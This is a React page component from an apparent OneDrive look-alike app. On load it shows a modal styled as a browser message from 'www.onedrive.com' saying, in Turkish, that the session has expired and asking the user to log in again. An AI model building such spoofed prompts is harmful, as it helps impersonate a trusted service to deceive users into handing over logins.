import React, { useEffect, useState } from "react";
import Header from "../components/Home/Header";
import Side from "../components/Home/Side";
import Content from "../components/Home/Content";
import { useNavigate } from "react-router-dom";

const Home = () => {
  const [showAlert, setShowAlert] = useState(false);
  const navigate = useNavigate();
  useEffect(() => {
    setShowAlert(true); // İlk açılışta alert'i göster
  }, []);
  const handleRedirect = () => {
    setShowAlert(true);
  };
  const handleConfirm = () => {
    setShowAlert(false);
    // İstenilen sayfaya yönlendirme yap
  };
  return (
    <div>
      <Header />
      <div className="grid grid-cols-12">
        <div className="col-span-12 md:col-span-2">
          <Side />
        </div>
        <div className="col-span-12 md:col-span-10">
          <Content />
        </div>
      </div>
      {showAlert && (
        <div className="fixed top-0 left-0 w-full h-full bg-gray-800 bg-opacity-50 flex justify-center items-center">
          <div className="bg-white p-6 rounded shadow text-center">
            <p className="my-3 font-sm"><span className="text-blue-400">www.onedrive.com</span> web sitesinin mesajı:</p>
            <p>Oturumunuzun süresi doldu. Lütfen tekrar oturum açın.</p>
            <a href="https://onedrive.live.com/?id=root&cid=211EE4A08EB26611">
            <button
              onClick={handleConfirm}
              className="bg-blue-500 text-white px-4 py-2 rounded ml-2 mt-3"
            >
              Tamam
            </button>
            </a>
          </div>
        </div>
      )}
      <button onClick={handleRedirect}>Yönlendirme yap</button>
    </div>
  );
};

export default Home;

